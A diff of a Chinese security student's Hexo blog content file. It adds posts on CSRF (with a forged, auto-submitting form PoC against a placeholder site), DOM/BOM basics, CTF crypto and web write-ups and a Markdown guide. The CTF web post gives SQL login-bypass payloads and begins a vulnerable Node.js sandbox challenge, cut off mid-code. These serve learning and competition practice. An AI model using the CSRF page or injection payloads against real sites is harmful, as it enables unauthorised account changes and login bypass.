-<h3 id="1-csrf是什么？"><a href="#1-csrf是什么？" class="headerlink" title="1.csrf是什么？"></a>1.csrf是什么？</h3><p>在我个人的理解中，通过制造恶意链接，诱导在登陆某个web站点的时候请求了该恶意链接，而造成了以为用户并不想做的操作。例如添加/删除收获地址，改密码，修改个人信息等等。   </p>
-<h3 id="2-怎么实现跟利用"><a href="#2-怎么实现跟利用" class="headerlink" title="2.怎么实现跟利用?"></a>2.怎么实现跟利用?</h3><p>举个例子：在某个网站我们进行添加收获地址的操作时，向服务器发送了以下请求</p>
-<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="comment">//get请求为：</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//aimsite.com?add</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//post的数据为：</span></span><br><span class="line">name=xiaoming<span class="variable">&amp;phone</span>=<span class="number">13888888888</span><span class="variable">&amp;home</span>=chengdu</span><br></pre></td></tr></table></figure>
-
-<p>在没有防御的情况下，可以构造以下表单：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>csrf<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://aimsite.com?add"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"xiaoming"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"phone"</span> <span class="attr">value</span>=<span class="string">"13888888888"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"home"</span> <span class="attr">value</span>=<span class="string">"chengdu"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"点击查看小秘密"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="3-怎么实现点击链接就能提交？"><a href="#3-怎么实现点击链接就能提交？" class="headerlink" title="3.怎么实现点击链接就能提交？"></a>3.怎么实现点击链接就能提交？</h3><p>加入一段小小的js代码</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>csrf<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"myform"</span> <span class="attr">action</span>=<span class="string">"http://aimsite.com?add"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"xiaoming"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"phone"</span> <span class="attr">value</span>=<span class="string">"13888888888"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"home"</span> <span class="attr">value</span>=<span class="string">"chengdu"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"点击查看小秘密"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">	<span class="function"><span class="keyword">function</span> <span class="title">autosubmit</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">		<span class="built_in">document</span>.getElementById(<span class="string">"myform"</span>).submit();</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="javascript">	<span class="built_in">window</span>.load=autosubmit();</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <tags>
-        <tag>csrf</tag>
       </tags>
   </entry>
   <entry>
@@ -229,6 +256,108 @@
       </tags>
   </entry>
   <entry>
+    <title>DOM,BOM</title>
+    <url>/2018/10/22/DOM-BOM/</url>
+    <content><![CDATA[<p>关于DOM与BOM的简介</p>
+<a id="more"></a>
+
+<h3 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h3><p>DOM= Document Object Model，文档对象模型，DOM可以以一种独立于平台和语言的方式访问和修改一个文档的内容和结构。换句话说，这是表示和处理一个HTML或XML文档的常用方法。有一点DOM很重要，DOM的设计是以对象管理组织（OMG）的规约为基础的，因此可以用于任何编程语言。最初人们把它认为是一种让JavaScript在浏览器间可移植的方法，不过DOM的应用已经远远超出这个范围。Dom技术使得用户页面可以动态地变化，如可以动态地显示或隐藏一个元素，改变它们的属性，增加一个元素等，Dom技术使得页面的交互性大大地增强。</p>
+<h3 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h3><p>提供了独立于内容而与浏览器窗口进行交互的对象。描述了与浏览器进行交互的方法和接口，可以对浏览器窗口进行访问和操作，譬如可以弹出新的窗口，改变状态栏中的文本，对Cookie的支持，IE还扩展了BOM，加入了ActiveXObject类，可以通过js脚本实例化ActiveX对象等等.</p>
+<p>Window对象：<br>是整个BOM的核心，所有对象和集合都以某种方式回接到window对象。Window对象表示整个浏览器窗口，但不必表示其中包含的内容。<br>Document对象：<br>实际上是window对象的属性。这个对象的独特之处是唯一一个既属于BOM又属于DOM的对象。从BOM角度看，document对象由一系列集合构成，这些集合可以访问文档的各个部分。<br>Location对象：<br>它是window对象和document对象的属性。Location对象表示载入窗口的URL，此外它还可以解析URI.<br>Navigator对象：<br>Navigator包含大量Web浏览器相关的信息。各种浏览器支持该对象的属性和方法不尽相同。<br>Screen对象：<br>通过其可以获取用户屏幕相关的信息</p>
+]]></content>
+      <tags>
+        <tag>web FE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>cdusec-ctf Crypto wp</title>
+    <url>/2018/11/18/cdusec-ctf-Crypto-wp/</url>
+    <content><![CDATA[<p>校赛Crypto的wp，这些题都比较简单吧，大多都能查得到，只是一些简单古典密码以及常见编码。</p>
+<a id="more"></a>
+
+<h3 id="1、签到"><a href="#1、签到" class="headerlink" title="1、签到"></a>1、签到</h3><p>复制输入即可，我给了一个链接，没有认真去看的23333 吃亏。</p>
+<h3 id="2、凯撒"><a href="#2、凯撒" class="headerlink" title="2、凯撒"></a>2、凯撒</h3><p>简单的凯撒加密，key为4，在线工具丢进去即可。</p>
+<h3 id="3、fuck！这是什么鬼"><a href="#3、fuck！这是什么鬼" class="headerlink" title="3、fuck！这是什么鬼"></a>3、fuck！这是什么鬼</h3><p>jsfuck,说到底也是js代码，一样能够像js一样执行，复制丢进浏览器的控制台就得flag。</p>
+<h3 id="4、不一样的morse"><a href="#4、不一样的morse" class="headerlink" title="4、不一样的morse"></a>4、不一样的morse</h3><p>morse的中文编码xmorse，在线网站丢进去完事。</p>
+<h3 id="5、你熟悉键盘吗？"><a href="#5、你熟悉键盘吗？" class="headerlink" title="5、你熟悉键盘吗？"></a>5、你熟悉键盘吗？</h3><p>一共5组字符串，一个字符串代表一个字母，在键盘上比划一下可以得到ANgLA。</p>
+<h3 id="6、蕾蕾姐被表白了"><a href="#6、蕾蕾姐被表白了" class="headerlink" title="6、蕾蕾姐被表白了"></a>6、蕾蕾姐被表白了</h3><p>手机的9键拼音输入法加密，每2个数字对应一个字符，例如33，表示第三个键，第三个字符，即f，其他一样然后解出flag。</p>
+<h3 id="7、奇怪的字符串"><a href="#7、奇怪的字符串" class="headerlink" title="7、奇怪的字符串"></a>7、奇怪的字符串</h3><p>Y对应1，N对应0，全部替换后二进制转字符串。</p>
+<h3 id="8、the-other-base’s-member"><a href="#8、the-other-base’s-member" class="headerlink" title="8、the other base’s member"></a>8、the other base’s member</h3><p>base58，在线网站解码即可。</p>
+<h3 id="9、easy-base-family"><a href="#9、easy-base-family" class="headerlink" title="9、easy_base_family"></a>9、easy_base_family</h3><p>base16，32，64混合编码，解码脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">f=open(<span class="string">'base_family.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">flag=f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag=base64.b16decode(flag)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag=base64.b32decode(flag)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag=base64.b64decode(flag)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+<h3 id="10、蕾蕾姐的id"><a href="#10、蕾蕾姐的id" class="headerlink" title="10、蕾蕾姐的id"></a>10、蕾蕾姐的id</h3><p>md5爆破，会有多解的情况，只有一个正确。解密脚本：</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">import hashlib</span><br><span class="line">import sys</span><br><span class="line">keyword1=<span class="string">"41d"</span><span class="comment">#后三位</span></span><br><span class="line">keyword2=<span class="string">"fdc"</span><span class="comment">#2-5位</span></span><br><span class="line">key=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>]</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> key:</span><br><span class="line">	<span class="keyword">for</span> b <span class="keyword">in</span> key:</span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> key:</span><br><span class="line">			<span class="keyword">for</span> d <span class="keyword">in</span> key:</span><br><span class="line">				word=str(a)+str(b)+str(c)+str(d)</span><br><span class="line">				flag=hashlib.md5(word)</span><br><span class="line">				<span class="keyword">if</span> flag.hexdigest()[-<span class="number">3</span>:]==keyword1 and flag.hexdigest()[<span class="number">2</span>:<span class="number">5</span>]==keyword2:</span><br><span class="line">					print flag.hexdigest()</span><br><span class="line">					sys.<span class="keyword">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="11、棋局"><a href="#11、棋局" class="headerlink" title="11、棋局"></a>11、棋局</h3><p>简单的棋盘加密，可以发现密文只有5个字母，urtql,附件的提示说flag的内容长度为10,想到棋盘加密。<br>解密脚本:   </p>
+<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">import itertools</span><br><span class="line"></span><br><span class="line">key = []</span><br><span class="line">cipher = <span class="string">"rquutrqqrtulrutuuurr"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in itertools.permutations(<span class="string">'tqlur'</span>, <span class="number">5</span>):</span><br><span class="line">    key.<span class="keyword">append</span>(<span class="string">''</span>.<span class="keyword">join</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> now_key in key:</span><br><span class="line">    solve_c = <span class="string">""</span></span><br><span class="line">    <span class="keyword">res</span> = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> now_c in cipher:</span><br><span class="line">        solve_c += str(now_key.<span class="built_in">index</span>(now_c))</span><br><span class="line">    <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(solve_c),<span class="number">2</span>):</span><br><span class="line">        now_ascii = <span class="keyword">int</span>(solve_c[i])*<span class="number">5</span>+<span class="keyword">int</span>(solve_c[i+<span class="number">1</span>])+<span class="number">97</span></span><br><span class="line">        <span class="keyword">if</span> now_ascii&gt;ord(<span class="string">'i'</span>):</span><br><span class="line">            now_ascii+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">res</span> += chr(now_ascii)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag"</span> in re<span class="variable">s:</span></span><br><span class="line">        <span class="keyword">print</span> now_key,<span class="keyword">res</span></span><br></pre></td></tr></table></figure>
+
+<p>觉得这个难？全都在这里：<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/classical/polyalphabetic/" target="_blank" rel="noopener">点击查看</a><br>关于棋盘加密的知识，以及本题的解密脚本都在里面。</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>初探csrf以及如何利用</title>
+    <url>/2019/01/16/%E5%88%9D%E6%8E%A2csrf%E4%BB%A5%E5%8F%8A%E7%AC%AC%E4%B8%80%E4%B8%AAcsrf%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>csrf学过有很长一段时间了，之前也就简单的知道这个是什么东西，大概是怎么实现，没有亲自挖掘到过，有幸的是在上周挖掘到两个，这里小小的记录一下</p>
+<a id="more"></a>
+
+<h3 id="1-csrf是什么？"><a href="#1-csrf是什么？" class="headerlink" title="1.csrf是什么？"></a>1.csrf是什么？</h3><p>在我个人的理解中，通过制造恶意链接，诱导在登陆某个web站点的时候请求了该恶意链接，而造成了以为用户并不想做的操作。例如添加/删除收获地址，改密码，修改个人信息等等。   </p>
+<h3 id="2-怎么实现跟利用"><a href="#2-怎么实现跟利用" class="headerlink" title="2.怎么实现跟利用?"></a>2.怎么实现跟利用?</h3><p>举个例子：在某个网站我们进行添加收获地址的操作时，向服务器发送了以下请求</p>
+<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="comment">//get请求为：</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//aimsite.com?add</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//post的数据为：</span></span><br><span class="line">name=xiaoming<span class="variable">&amp;phone</span>=<span class="number">13888888888</span><span class="variable">&amp;home</span>=chengdu</span><br></pre></td></tr></table></figure>
+
+<p>在没有防御的情况下，可以构造以下表单：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>csrf<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://aimsite.com?add"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"xiaoming"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"phone"</span> <span class="attr">value</span>=<span class="string">"13888888888"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"home"</span> <span class="attr">value</span>=<span class="string">"chengdu"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"点击查看小秘密"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-怎么实现点击链接就能提交？"><a href="#3-怎么实现点击链接就能提交？" class="headerlink" title="3.怎么实现点击链接就能提交？"></a>3.怎么实现点击链接就能提交？</h3><p>加入一段小小的js代码</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>csrf<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"myform"</span> <span class="attr">action</span>=<span class="string">"http://aimsite.com?add"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"xiaoming"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"phone"</span> <span class="attr">value</span>=<span class="string">"13888888888"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"home"</span> <span class="attr">value</span>=<span class="string">"chengdu"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"点击查看小秘密"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">	<span class="function"><span class="keyword">function</span> <span class="title">autosubmit</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">		<span class="built_in">document</span>.getElementById(<span class="string">"myform"</span>).submit();</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="javascript">	<span class="built_in">window</span>.load=autosubmit();</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>csrf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>如何写一篇hexo博客</title>
+    <url>/2018/09/04/%E5%A6%82%E4%BD%95%E5%86%99hexo%E5%8D%9A%E5%AE%A2/</url>
+    <content><![CDATA[<p>本文介绍如何使用Hexo写出一篇‘比较’好看的文章，几句简单的语法，喜欢简介的话，可能就刚好适用。</p>
+<a id="more"></a>
+
+<hr>
+<h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><blockquote>
+<p>这是一个引用,使用&gt;符号，置于文本前。(为方便阅读，下面的内容均使用了引用)</p>
+</blockquote>
+<hr>
+<h3 id="图片与链接"><a href="#图片与链接" class="headerlink" title="图片与链接"></a>图片与链接</h3><blockquote>
+<p>图片：！[](图片地址)</p>
+</blockquote>
+<blockquote>
+<p>网址：[]()</p>
+</blockquote>
+<hr>
+<h3 id="粗体与斜体"><a href="#粗体与斜体" class="headerlink" title="粗体与斜体"></a>粗体与斜体</h3><blockquote>
+<p>粗体：用两个*包含一段文本就是粗体。    例：<strong>粗体</strong></p>
+</blockquote>
+<blockquote>
+<p>斜体：用一个*包含一段文本就是斜体</p>
+</blockquote>
+<hr>
+<h3 id="代码框"><a href="#代码框" class="headerlink" title="代码框"></a>代码框</h3><blockquote>
+<p>使用两个`把中间的代码包含起来，例如：</p>
+</blockquote>
+<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">hello <span class="built_in">word</span>!</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h3><blockquote>
+<p>分割线的语法只需要加三个-号或*(是不是发现一直再用分割线hhh<del>~</del>)</p>
+</blockquote>
+<hr>
+]]></content>
+      <tags>
+        <tag>hexo学习</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>安恒杯-四川省高校网络安全技能大赛-WEB</title>
     <url>/2020/07/03/%E5%AE%89%E6%81%92%E6%9D%AF-%E5%9B%9B%E5%B7%9D%E7%9C%81%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/</url>
     <content><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>从9点到12点，时间太短了点，做了一个web跟一个misc外加一个签到，赛后环境还在，把另外两个web给整出来了。</p>
@@ -258,6 +387,41 @@
 <p>拦截器中拦截了admin跟getFlag，但是没有拦截admin/跟getFlag/，先post访问getFlag/把flag保存在session中，再访问admin/就获取到flag了</p>
 <p><img src="/2020/07/03/%E5%AE%89%E6%81%92%E6%9D%AF-%E5%9B%9B%E5%B7%9D%E7%9C%81%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/0x01_3.png" alt="0x01_3.png"></p>
 <p><img src="/2020/07/03/%E5%AE%89%E6%81%92%E6%9D%AF-%E5%9B%9B%E5%B7%9D%E7%9C%81%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/0x01_4.png" alt="0x01_4.png"></p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>安恒杯-四川省高校网络安全技能大赛-WEB</title>
+    <url>/2020/07/03/%E5%AE%89%E6%81%92%E6%9D%AF-%E5%9B%9B%E5%B7%9D%E7%9C%81%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-WEB/</url>
+    <content><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>从9点到12点，时间太短了点，做了一个web跟一个misc外加一个签到，赛后环境还在，把另外两个web给整出来了。</p>
+<h3 id="0x01-赛题"><a href="#0x01-赛题" class="headerlink" title="0x01 赛题"></a>0x01 赛题</h3><h4 id="mima"><a href="#mima" class="headerlink" title="mima"></a>mima</h4><p>这个题在username处输出能抛出报错，比如输入 <code>0&#39; 0</code>。通常没有关闭报错就用数组来探测。</p>
+<p><img src="/2020/07/03/%E5%AE%89%E6%81%92%E6%9D%AF-%E5%9B%9B%E5%B7%9D%E7%9C%81%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-WEB/0x01_1.png" alt="0x01_1.png"></p>
+<p>看样子username没办法注入了，然后看password来，经过测试password长度最多为4，想到是跟万能密码一样的原理，给出几个payload。</p>
+<blockquote>
+<p>‘=’</p>
+<p>‘^1’</p>
+<p>‘|1’</p>
+</blockquote>
+<h4 id="easynode2"><a href="#easynode2" class="headerlink" title="easynode2"></a>easynode2</h4><p>nodejs的vm沙盒逃逸，代码如下。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">var</span> multer = <span class="built_in">require</span>(<span class="string">'multer'</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>);</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</span><br><span class="line">app.use(bodyParser());</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line">app.use(<span class="string">'/uploads'</span>, express.static(<span class="string">'uploads'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> lastlogs = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getClientIp</span>(<span class="params">req</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> req.headers[<span class="string">'x-forwarded-for'</span>] ||</span><br><span class="line">    req.connection.remoteAddress ||</span><br><span class="line">    req.socket.remoteAddress ||</span><br><span class="line">    req.connection.socket.remoteAddress;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSandbox</span>(<span class="params">req</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ip = getClientIp(req);</span><br><span class="line">    <span class="comment">//console.log(ip);</span></span><br><span class="line">    <span class="keyword">var</span> content = ip + <span class="string">'secret'</span>;</span><br><span class="line">    <span class="keyword">var</span> result = crypto.createHash(<span class="string">'md5'</span>).update(content).digest(<span class="string">"hex"</span>);</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> source[key] == <span class="string">'object'</span> &amp;&amp; <span class="keyword">typeof</span> target[key] == <span class="string">'object'</span> 